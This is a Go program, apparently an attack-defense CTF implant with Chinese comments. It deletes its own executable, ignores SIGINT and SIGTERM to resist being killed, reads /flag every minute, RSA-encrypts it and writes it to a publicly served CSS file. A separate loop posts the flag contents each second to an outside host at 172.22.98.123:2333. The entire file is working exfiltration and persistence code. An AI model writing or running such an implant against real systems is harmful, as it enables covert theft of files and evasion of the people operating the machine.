package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// 公钥字符串，替换为您的RSA公钥
const publicKeyStr = `
`

func main() {
	// 删除binary
	absPath, err1 := os.Executable()
	err2 := os.Remove(absPath)
	if err2 != nil {
		return
	}
	if err1 != nil {
		return
	}
	fmt.Println("deleted myself, i am a bad~~~~ boy!!")

	// 定义信号处理函数
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT)
	signal.Notify(sigCh, syscall.SIGTERM)

	go func() {
		<-sigCh
		fmt.Println("you can never use kill -15")
	}()

	go PostFlag()

	// 每隔1分钟读取/flag文件并RSA加密后Base64编码并写入/var/www/html/index2.css
	for {
		flagData, err := ioutil.ReadFile("/flag")
		if err != nil {
			fmt.Println("read err:", err)
		} else {
			// 加密并Base64编码flagData
			encryptedData, err := rsaEncryptAndBase64Encode([]byte(publicKeyStr), flagData)
			if err != nil {
				fmt.Println("base64 err:", err)
			} else {
				err := ioutil.WriteFile("/var/www/html/index2.css", encryptedData, 0644)
				if err != nil {
					fmt.Println("write err:", err)
				} else {
					fmt.Println("bingo")
				}
			}
		}

		// 等待1分钟
		time.Sleep(time.Minute)
	}
}

func rsaEncryptAndBase64Encode(publicKeyPEM []byte, data []byte) ([]byte, error) {
	// 解析PEM格式的公钥
	block, _ := pem.Decode(publicKeyPEM)
	if block == nil {
		return nil, fmt.Errorf("parse err")
	}

	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	// 使用RSA公钥加密数据
	rsaPubKey, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("pasrse err")
	}

	encryptedData, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, data, nil)
	if err != nil {
		return nil, err
	}

	// 对加密后的数据进行Base64编码
	encodedData := base64.StdEncoding.EncodeToString(encryptedData)

	return []byte(encodedData), nil
}

func PostFlag() {
	for {
		// 读取文件内容
		content, err := ioutil.ReadFile("/flag")
		if err != nil {
			fmt.Printf("read err：%v\n", err)
			time.Sleep(time.Minute) // 等待一分钟后重试
			continue
		}

		// 发送POST请求
		_, err = http.Post("http://172.22.98.123:2333/received", "text/plain", bytes.NewReader([]byte(fmt.Sprintf("yyz-is-so-cute%s", content))))
		if err != nil {
			fmt.Printf("post err：%v\n", err)
		} else {
			fmt.Println("good boy!")
		}

		time.Sleep(time.Second) // 每分钟执行一次
	}
}
